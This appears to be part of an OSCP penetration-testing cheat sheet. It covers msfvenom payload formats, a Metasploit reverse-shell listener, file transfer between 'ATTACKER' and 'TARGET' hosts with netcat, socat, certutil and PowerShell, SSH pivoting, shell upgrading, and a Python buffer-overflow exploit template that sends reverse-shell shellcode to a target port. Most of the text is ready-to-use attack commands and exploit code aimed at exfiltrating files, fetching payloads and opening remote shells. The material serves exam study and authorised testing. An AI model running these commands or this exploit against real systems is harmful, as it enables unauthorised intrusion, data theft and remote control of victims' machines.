-f hta-psh                  # HTML application, good if .hta files are accessible
-f war > shell.war          # Web Archive (WAR) file, good for Java web servers
-f js_be                    # Big-Edian Javascript (e.g. some Solaris)
-f js_le                    # Little-endian Javascript (most OSes / CPUs)
-f python                   # Python shell-code generation (stdout)
-f perl                     # Perl shell-code generation (stdout)
-f ruby                     # Ruby shell-code generation (stdout)
```

For Metasploit Framework, use **exploit/multi/handler** to receive stageless **AND STAGED** payload connections:
```sh
msfconsole -q -x "use exploit/multi/handler; set payload <PAYLOAD>; set LHOST <IP>; set LPORT <LISTENING PORT: exploit;"
```

### 3.2 File Transfer, Downloading and Hosting ###

```sh
# Netcat (usually from TARGET to ATTACKER)
nc <ATTACKER IP> <PORT> < <FILE NAME> # On TARGET
sudo nc -nlvp <PORT> > <FILE NAME> # On ATTACKER

# Socat (usually from TARGET TO ATTACKER)
socat TCP4:<ATTACKER IP>:<PORT> file:<FILE NAME>,create # On TARGET
sudo socat TCP4-LISTEN:<PORT>,fork file:<FILE NAME> # On ATTACKER

# Linux download (usually from ATTACKER to TARGET)
wget http://<IP>:<PORT>/<REMOTE FILE>
curl http://<IP>:<PORT>/<REMOTE FILE> --output <LOCAL FILE NAME>

# Windows cmd.exe download (usually from ATTACKER to TARGET)
certutil.exe -urlcache -split -f http://<IP>:<PORT>/<REMOTE FILE> <LOCAL FILE NAME>

# Windows powershell.exe cmdlet download (usually from ATTACKER to TARGET)
Invoke-WebRequest http://<IP>:<PORT>/<REMOTE FILE> -OutFile <LOCAL FILE NAME>
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<IP>:<PORT>/<REMOTE FILE>', '.\<LOCAL FILE NAME>')"

# SMB server (via impacket) for sharing files
impacket-smbserver -ip <SHARE HOST IP> <SHARE NAME> <SHARE ROOT FOLDER>
# Additional SMBv2 Support (If receive "Error 104: Connection Reset" for above)
impacket-smbserver -ip <SHARE HOST IP> <SHARE NAME> <SHARE ROOT FOLDER> -smb2support

# Python SimpleHTTPServer to serve files on port 80 (preferably)
sudo python -m SimpleHTTPServer 80
```

### 3.3 Searchsploit and ExploitDB (EDB) ###

**Objective**: Use searchsploit to find possible vulnerabilities on Exploit DB (EDB), each with an associated EDB number:

```sh
# List vulnerabilities
searchsploit <VULNERABLE SOFTWARE>

# Copy content for a particular EDB number to a local file
# File is also located at https://exploitdb.com/exploits/<EDB NUMBER>
searchsploit -x <EDB NUMBER> > <LOCAL FILE>
```
### 3.4 Port Forwarding ###

**Objective**: Allow for pivoting from 1 network to another and/or manipulating a request to be received as a particular IP.

```sh

# Rinetd - modify /etc/rinetd.conf by adding line(s), for example:
0.0.0.0 <LOCAL PORT> <REMOTE IP> <REMOTE PORT>
# Restart Rinetd service to forward <LOCAL PORT> data to <REMOTE IP>:<REMOTE PORT>
sudo service rinetd restart

# SSH Local port Forwarding (Executed on <LOCAL IP>)
# Binds <LOCAL IP>:<LOCAL PORT> to <REMOTE IP>:<REMOTE PORT>
ssh -L -N <LOCAL IP>:<LOCAL PORT>:<REMOTE IP>:<REMOTE PORT> <USER>@<REMOTE IP>

# SSH Remote Port Forwarding (Executed on <REMOTE IP>)
# Open listener on <LOCAL IP>:<LOCAL PORT> forwarding packets to <IP>:<REMOTE PORT> on <REMOTE IP> (<IP> can be 127.0.0.1)
ssh -N -R <LOCAL IP>:<LOCAL PORT>:<IP>:<REMOTE PORT> <USER>@<LOCAL IP>

# SSH Dynamic Port Forwarding (Executed on <LOCAL IP>)
# Tunnel incoming traffic to <REMOTE IP> via <BINDING PORT> acting as proxy
ssh -D <BINDING PORT> <USER>@<REMOTE IP>

# Proxychains-NG (v4.14) command execution for SSH dynamic port forwarding
# Note: Set /etc/proxychains4.conf last line to "socks5 127.0.0.1 <BINDING PORT>"
proxychains -f /etc/proxychains4.conf -q <COMMAND>

# SShuttle command (user-friendly but unreliable) (Executed on <LOCAL IP>)
# Establish connection via SSH to <REMOTE IP>:<REMOTE PORT> for accessing <SUBNET>/<MASK>
python3 -m sshuttle -r <USER>@<REMOTE IP>:<REMOTE PORT> <SUBNET>/<MASK>
```

As an additional note, SOCKS5 proxy is on layer 5 of OSI model, supporting higher-level protocols (e.g. HTTP), as well as IPv4/6, TCP and UDP. Therefore protocols like ICMP will fail (e.g. ping / traceroute etc.) 

### 3.5 Steganography ###

Media files can possible hide files. We can view metadata, or extract information, e.g. using steghide as folows:
```sh
steghide info <IMAGE FILE>          # Look for embedded text / file-content
stehide extract -sf <IMAGE FILE>    # Extract text / file-content
```

### 3.6 Improving / Upgrading system shell ###

Improving system shell by getting tty:
```sh
python -c 'import pty; pty.spawn("/bin/bash")'
```
Complete interactive system shell procedure
1. Obtain tty [Target shell]
2. Type "Ctrl+Z" to return back to Attacker shell
3. Type "stty raw -echo" [Attacker Shell]
4. Type "fg" to return back to Target Shell
5. Press "Enter"
6. Start running commands (will be a bit less responsive)

## 4 Buffer Overflow Attack ##

In the context of OSCP for PWK-2020, the focus appears to be on using [Immunity Debugger](https://www.immunityinc.com/products/debugger/) on Windows PE32 (x86) binaries (henceforth termed EXE) as opposed to others (e.g. gdb on ELF). This section seeks to streamline and simplify that process.

A buffer overflow attack tends to follow a standard methodology.
1. Define format / script to send payload to EXE
2. Check for vulnerability by sending arbitrary large payload to EXE
3. Create MSF pattern as payload, send payload to EXE
4. Use ImmunityDebugger to record EIP value, calculate pattern offset to EIP
5. Overwrite EIP with "jmp esp" (\xff\xe4) located in "vulnerable modules"
6. Use msfvenom to generate shellcode to execute upon overflow
7. Pad shellcode with nop-sled to improve exploit reliability
8. Run the exploit and hope to get reverse shell

The following is a sample python template, with appropriate commands to send the payload to an external listening server / as argument to the EXE:
```py
import socket, os

# (1) Calculation of EIP offset
# Create MSF pattern (e.g. length10000): !mona pattern_create 10000
#   - MSF: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 10000
# Compute Offset of EIP: !mona pattern_offset <EIP's value in ASCII>
#   - MSF: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP's value in ASCII> -l 10000
eip_offset = 10000

# (2) Overwrite buffer with junk until we reach EIP
# Note: It is possible to hide the shellcode here too if necessary!
junk = b"A" * eip_offset

# (3) EIP points to "jmp esp" to start executing code on stack
# - List modules: !mona modules
#   - Find module with "Rebase, SafeSEH, ASLR, NXCompat" disabled if possible
# - Find "jmp esp" address in a module: !mona find -s '\xff\xe4' -m <MODULE>
#   - Note: Make sure address does NOT have '\x00' = null byte in payload!
eip = b"\x12\x34\x56\x78"

# (4) Define NOP-sled to improve reliability
nop = b"\x90" * 40

# (5) [Reverse Shell] Shellcode
# msfvenom -p windows/(x64??)/shell_reverse_tcp lhost=<ATTACKER IP> lport=<LISTENING PORT> -b '\x00' -f python
# Note: additional encoding (e.g. -e x86/alpha_upper) or specification of bad characters (e.g. -b '...') may be required for certain applications...
buf = b""

# Initial payload = MSF pattern
# Final payload   = [AAAAAA...AAA][EIP][NOP Sled][Shellcode]
# Note: Check for enough space after EIP. Changed if required (but EIP is fixed!)
payload = junk + eip + nop + buf

# Possible Scenario 1: Sending payload to a port 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<TARGET IP>", <PORT>))
s.sendall(payload)
s.close()

# Possible Scenario 2: Sending payload as 1st argument to binary
#os.system('<EXE> \"' + payload + '\"')

```